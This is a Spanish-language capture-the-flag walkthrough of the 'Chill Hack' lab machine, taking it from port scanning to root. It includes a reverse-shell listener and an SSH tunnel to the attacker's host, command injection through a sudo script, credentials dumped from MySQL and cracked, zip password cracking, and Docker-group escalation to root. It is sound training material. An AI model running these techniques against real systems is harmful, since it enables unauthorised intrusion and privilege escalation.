---
title : "Chill Hack CTF Walkthrough by loh"
date: 2026-05-12 01:29:05 +0200
categories: [CTF Walkthrough]
tags: [Easy, THM, Linux, FTP-Anonymous, Command-Injection, Web-Enumeration, Reverse-Shell, Sudo-Abuse, MySQL, Hash-Cracking, Port-Forwarding, Steganography, Docker-Privilege-Escalation, Root]
---
![logo](/assets/post_img/ChillHack/logochillhack.png)


Comenzamos comprobando la conectividad con la máquina objetivo y, seguidamente, realizamos un escaneo de puertos con RustScan para identificar los servicios expuestos.

Se detectan tres servicios principales:

- SSH (22) → OpenSSH 8.2p1
- FTP (21) → vsftpd 3.0.5
- HTTP (80) → Apache 2.4.41

```bash
❯ rustscan -a 10.113.129.13 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'


PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.167.109
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:61:f7:2c:1a:2a:86:fd:bc:7b:8d:63:d0:9d:71:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDi9J55OjRjDqLg1O3FemXhy4sjUxj1FQNC/xaSYdlkYRwpdTPoG8PneYr0gJ2X4Gy3Co9jzojHzfmRXAYgmmRhLV2sVQs9AtunPBedJ4CgwtvIU3OSeBxBPVb3LoM7UwdNplwnplNASczk/g4ueDvSz2p8fAAnns+Qaaea2UCbjs5szqObl7hd8zmVKaYXcTo7Q1sE6YEkf45A9NFXXQcvX/IgLYEuKVchL/pKhI427/IVW/SxRJcNs9aeKX5cBfRv+OMR+9+lswC/pzr2mOHW+KawAeCOvkAzt3hxbf/JWJJ1cfs4fHhLxSNe44FWfZtywzUcDgtNhAQmJeZwdltbMFYTd74PSiF9VoZJR6YC/9borQdrFJMxRrmJFozSYu3/SuhoxPYb5NhioIr+anaVSqg5UwzNda7s3BcL8eA7LRJyKAFWi9SNxJjahzzuDA/qYsz0chDtuclmkTkjb+hc5buYzCUI+uU7hRnS4yTbPwRj6IPoApBF6e5u8bk7RFE=
|   256 f9:a6:a9:a7:8b:ef:27:ff:2a:ae:8e:67:9f:ee:25:e3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrjffZzABfamdXJztWZ2/sMFftVQRvNsLcHMzLTHdppVuKgazpz1SgJQITf/E8MEiqImZE88kidB0F7nGQtGFM=
|   256 e3:e9:f9:cf:62:6a:26:e1:cf:e4:4f:56:a0:a9:8f:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDnXvxEzsaBZF+1htdKMjunM/ZzMC4BXRmdTlTPfEWOG
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-title: Game Info
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

El escaneo también muestra que el servicio FTP permite acceso anónimo, lo que supone un primer punto de entrada para la enumeración de la máquina. Dentro del FTP encontramos un fichero llamado note.txt, que descargamos para analizar su contenido.
```bash
❯ ftp 10.113.129.13
Connected to 10.113.129.13.
220 (vsFTPd 3.0.5)
Name (10.113.129.13:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17574|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||36769|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |*********************************************************************************************************************************************|    90        1.01 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.66 KiB/s)
```

Al leer el fichero, encontramos una pista importante:
```bash
❯ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Esta nota indica que existe algún tipo de filtrado sobre los comandos introducidos, lo que nos hace pensar que puede haber una funcionalidad vulnerable en la web donde se ejecuten comandos del sistema.

A continuación, realizamos enumeración web con Feroxbuster sobre el puerto 80. Durante el escaneo se descubre el directorio /secret/, que contiene un fichero index.php y varios recursos gráficos.
```bash
❯ feroxbuster -u http://10.113.129.13/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php, html, txt, tar.gz \
  -t 100 -q
  
301      GET        9l       28w      315c http://10.113.129.13/secret => http://10.113.129.13/secret/
200      GET        9l       13w      168c http://10.113.129.13/secret/index.php
301      GET        9l       28w      322c http://10.113.129.13/secret/images => http://10.113.129.13/secret/images/
200      GET     4718l    21314w  1112123c http://10.113.129.13/secret/images/blue_boy_typing_nothought.gif
200      GET      633l     4243w   228324c http://10.113.129.13/secret/images/FailingMiserableEwe-size_restricted.gif
```

Al acceder manualmente a /secret/index.php, encontramos una página con un formulario que permite introducir comandos. La propia web muestra el mensaje “Are you a hacker?”, lo que confirma que esta funcionalidad forma parte del reto.
![command](/assets/post_img/ChillHack/command.png)
![alert](/assets/post_img/ChillHack/alert.png)

Probamos comandos simples como ls para validar si realmente existe ejecución de comandos en el servidor. Aunque la página aplica algún tipo de filtrado, la respuesta confirma que podemos interactuar con el sistema. 

Después de analizar el comportamiento del formulario, se prepara una reverse shell utilizando una payload compatible con nc y mkfifo, generada con [RevShells](https://www.revshells.com). El objetivo es establecer una conexión inversa desde la máquina víctima hacia nuestra máquina atacante. 

![revshell](/assets/post_img/ChillHack/revshell.png)

Primero dejamos un listener activo en nuestra máquina `nc -lvnp 4444` y después introducimos la payload en el formulario vulnerable, apuntando a nuestra IP de la VPN y al puerto configurado.

Una vez ejecutada la payload, recibimos una shell como el usuario del servidor web. Con acceso inicial como www-data, empezamos la fase de enumeración local. Listamos los usuarios existentes dentro de /home y encontramos varios usuarios del sistema:
```bash
www-data@ip-10-113-129-13:/home$ ls -l
total 16
drwxr-x--- 2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x 5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x--- 4 aurick  aurick  4096 Oct  3  2020 aurick
drwxr-xr-x 3 ubuntu  ubuntu  4096 May  5 15:26 ubuntu
```

A continuación, comprobamos los permisos sudo disponibles para el usuario www-data. El resultado indica que www-data puede ejecutar el script /home/apaar/.helpline.sh como el usuario apaar sin necesidad de contraseña:
```bash
www-data@ip-10-113-129-13:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ip-10-113-129-13:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-113-129-13:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ip-10-113-129-13:/home/apaar$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 6 root  root  4096 May  5 15:26 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
```

Revisamos el contenido del script para entender su funcionamiento. El script solicita dos entradas al usuario y posteriormente ejecuta directamente el contenido introducido en la variable msg. 
```bash
www-data@ip-10-113-129-13:/home/apaar$ cat .helpline.sh 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Este comportamiento es inseguro, ya que permite inyectar comandos arbitrarios. Aprovechamos esta debilidad para ejecutar /bin/bash como el usuario apaar. Al introducir /bin/bash como mensaje, obtenemos una shell con los permisos del usuario apaar, y encontramos la flag de usuario dentro del directorio personal de apaar.
```bash
www-data@ip-10-113-129-13:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: /bin/bash
Hello user! I am /bin/bash,  Please enter your message: /bin/bash

id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)

find /home -name *.txt 2>/dev/null
/home/apaar/local.txt

cat /home/apaar/local.txt
{USER-FLAG: hazte la máquina va}
```

Después de conseguir acceso como apaar, seguimos enumerando el sistema. Revisando los ficheros de la aplicación web, encontramos credenciales de conexión a la base de datos MySQL dentro de index.php.
```bash
www-data@ip-10-113-129-13:/var/www/files$ cat index.php | grep "$con = new PDO"
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

Con estas credenciales accedemos a MySQL como usuario root y revisamos las bases de datos disponibles. Dentro de la base de datos webportal encontramos una tabla llamada users, donde aparecen dos usuarios y sus contraseñas en formato hash MD5:
```bash
www-data@ip-10-113-129-13:/var/www/files$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.07 sec)

mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> 
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.01 sec)
```

Utilizando CrackStation conseguimos identificar el valor original de ambos hashes:
```bash
❯ ncat creds.txt
7e53614ced3640d5de23f111806cc4fd	md5	masterpassword
686216240e5af30df0501e53c789a649	md5	dontaskdonttell
```

Durante la enumeración de servicios locales, observamos que existe un servicio escuchando únicamente en 127.0.0.1:9001.
```bash
www-data@ip-10-113-129-13:/var/www/files$ ss -at
State      Recv-Q Send-Q            Local Address:Port                 Peer Address:Port  Process                                                                                   
LISTEN     0      128                     0.0.0.0:ssh                       0.0.0.0:*                                                                                               
LISTEN     0      511                   127.0.0.1:9001                      0.0.0.0:*                                                                                               
LISTEN     0      4096              127.0.0.53%lo:domain                    0.0.0.0:*                                                                                               
LISTEN     0      70                    127.0.0.1:33060                     0.0.0.0:*                                                                                               
LISTEN     0      151                   127.0.0.1:mysql                     0.0.0.0:*                                                                                               
ESTAB      0      0                 10.113.129.13:41114              10.113.158.183:https                                                                                           
ESTAB      0      0                 10.113.129.13:55946               10.113.169.12:https                                                                                           
ESTAB      0      0                 10.113.129.13:57610             192.168.167.109:4444                                                                                            
CLOSE-WAIT 0      0                 10.113.129.13:39478             192.168.167.109:4444                                                                                            
LISTEN     0      32                            *:ftp                             *:*                                                                                               
LISTEN     0      128                        [::]:ssh                          [::]:*                                                                                               
LISTEN     0      511                           *:http                            *:*                                                                                               
CLOSE-WAIT 1      0        [::ffff:10.113.129.13]:http     [::ffff:192.168.167.109]:57342                                                                                           
ESTAB      0      0        [::ffff:10.113.129.13]:http     [::ffff:192.168.167.109]:35528  
```

Como este servicio solo está disponible localmente desde la máquina víctima, lo comprobamos con curl.
```bash
www-data@ip-10-113-129-13:/var/www/files$ curl 127.0.0.1:9001
<html>
<body>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				               		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```

La respuesta muestra un portal interno de login llamado Customer Portal.

Para poder visualizar este servicio desde nuestra máquina atacante, realizamos un túnel SSH remoto, redirigiendo el puerto interno 9001 de la víctima hacia nuestra máquina.
```bash
www-data@ip-10-113-129-13:/var/www/files$ ssh -N -R 192.168.167.109:9001:127.0.0.1:9001 kali@192.168.167.109
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.167.109 (192.168.167.109)' can't be established.
ECDSA key fingerprint is SHA256:MM+4rWFrqfrQG1hod+DhxEHiV/Xyl6xjJ+PDPKsdYuM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
kali@192.168.167.109's password: 
```

Una vez creado el túnel, accedemos desde el navegador a 127.0.0.1:9001 y se muestra el portal interno.
![customportal](/assets/post_img/ChillHack/customportal.png)

En el portal se prueban las credenciales obtenidas anteriormente. Al acceder correctamente, la aplicación nos redirige a una página llamada hacker.php, donde aparece una imagen con el mensaje:
![msg](/assets/post_img/ChillHack/msg.png)

Este mensaje actúa como pista para revisar la imagen descargada, ya que sugiere que puede contener información oculta.

Descargamos la imagen de la página y realizamos un análisis de esteganografía con steghide. Al extraer los datos ocultos, obtenemos un fichero llamado backup.zip. El fichero ZIP está protegido con contraseña, por lo que generamos un hash compatible con John the Ripper utilizando zip2john. Después lanzamos un ataque de diccionario con rockyou.txt, consiguiendo la contraseña pass1word y seguidamente, descomprimimos el archivo obteniendo el fichero source_code.php.
```bash
❯ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"backup.zip".

❯ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password

❯ zip2john backup.zip > ziphash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8

❯ john ziphash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2026-05-05 19:20) 16.66g/s 204800p/s 204800c/s 204800C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

❯ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         

```

Analizando el código fuente, encontramos una comprobación de contraseña codificada en Base64. Decodificamos el valor Base64 y obtenemos una nueva contraseña: !d0ntKn0wmYp@ssw0rd.
```bash
❯ ncat source_code.php | grep "password)"
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		
❯ echo -n IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d
!d0ntKn0wmYp@ssw0rd     
```

Probamos esta contraseña mediante SSH con el usuario anurodh y conseguimos acceso al sistema. Una vez dentro, comprobamos los grupos del usuario como se hace de manera recurrente en la metodologia de una enumeración.
```bash
❯ ssh anurodh@10.113.129.13
anurodh@10.113.129.13's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

anurodh@ip-10-113-129-13:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

El usuario anurodh pertenece al grupo docker, lo que supone una vía clara de escalada de privilegios. Un usuario dentro de este grupo puede montar el sistema de ficheros raíz dentro de un contenedor y acceder al sistema host con privilegios elevados. Finalmente accedemos al directorio /root y leemos la flag final.

Listamos las imágenes Docker disponibles:
```bash
anurodh@ip-10-113-129-13:~$ docker images
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
alpine        latest    a24bb4013296   5 years ago   5.57MB
hello-world   latest    bf756fb1ae65   6 years ago   13.3kB
```

Utilizamos la imagen alpine para montar "/" dentro del contenedor y ejecutar un chroot, obteniendo una shell con privilegios de root sobre el sistema host. Comprobamos la identidad del usuario actual, siendo este el root del sistema. 
```bash
anurodh@ip-10-113-129-13:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

# cd root
# ls
proof.txt  snap
# cat proof.txt


{ROOT-FLAG: no hagas trampas y hazte la máquina}


--------------------------------------------Designed By -------------------------------------------------------
					|  Anurodh Acharya |
					---------------------

	              		    Let me know if you liked it.

Twitter
	- @acharya_anurodh
Linkedin
	- www.linkedin.com/in/anurodh-acharya-b1937116a
```

Con esto se completa la máquina, habiendo pasado por las siguientes fases: enumeración inicial, explotación web mediante ejecución de comandos, movimiento lateral al usuario apaar, obtención de credenciales desde MySQL, acceso al portal interno mediante túnel SSH, extracción de credenciales ocultas con esteganografía y escalada final a root abusando del grupo Docker.

Hasta la próxima,

~loh♡.